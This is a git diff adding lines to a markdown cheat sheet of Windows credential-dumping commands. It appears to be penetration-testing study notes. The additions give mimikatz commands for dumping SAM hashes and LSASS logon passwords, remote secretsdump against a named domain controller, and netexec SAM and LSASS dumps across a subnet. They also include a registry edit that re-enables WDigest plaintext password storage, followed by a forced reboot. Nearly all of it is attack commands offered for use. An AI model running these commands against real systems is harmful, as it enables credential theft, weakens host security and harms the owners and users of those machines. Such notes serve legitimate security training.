@@ -17,6 +17,9 @@ move system.save \\10.10.15.16\tmp
 # Dumping Hashes with Impacket's secretsdump.py
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
+# or remotly (auto)
+mpacket-secretsdump -k -no-pass -target-ip 192.168.210.10 internal.zsm.local/Administrator@ZPH-SVRDC01.zsm.local
+
 # Cracking Hashes with Hashcat
 sudo vim hashestocrack.txt # store the LM hashes here 
 sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
@@ -24,6 +27,15 @@ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 # Remote Dumping & LSA Secrets Considerations
 crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa # Dumping LSA Secrets Remotely (Domains  cached creds + Services creds )
 crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam # Dumping SAM Remotely
+
+----------------------------
+# with mimikatz (auto)
+mimikatz.exe "privilege::debug" "lsadump::sam" exit
+
+# with netexec
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump #  if fail try this old method (similar to secretdump)
+
 ```
 ## Attacking LSASS
 ```bash
@@ -47,6 +59,30 @@ pypykatz lsa minidump /home/peter/Documents/lsass.dmp # Using Pypykatz to Extrac
 
 # 3_ Cracking the NT Hash with Hashcat:
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+
+# if u can't crack the hash u can force lsa to save password in plain text so
+  # how ? => Enable WDigest (store plaintext passwords)
+
+------------------------------------
+# with mimikatz (auto)
+mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit
+
+# with mimikatz & WDigest (plain-text passwords)
+  # WDigest: old Windows auth protocol storing plaintext passwords in LSASS.
+  # Disabled by default in modern Windows > win server 2012 (UseLogonCredential=0).
+# Enable WDigest (store plaintext passwords)
+reg add "HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" # check , UseLogonCredential  REG_DWORD  0x1
+shutdown /r /t 0 /f # Reboot required
+# Dump creds with Mimikatz
+sekurlsa::logonpasswords   # all creds + plain text
+sekurlsa::wdigest          # WDigest creds only
+
+# with netexec
+nxc smb victim -u ‘’ -p ‘’ -M lsassy
+netexec smb MS01 -u <user> -p "<pass>" -M nanodump # better
+
+
 ```
 
 ## Attacking Windows Credential Manager
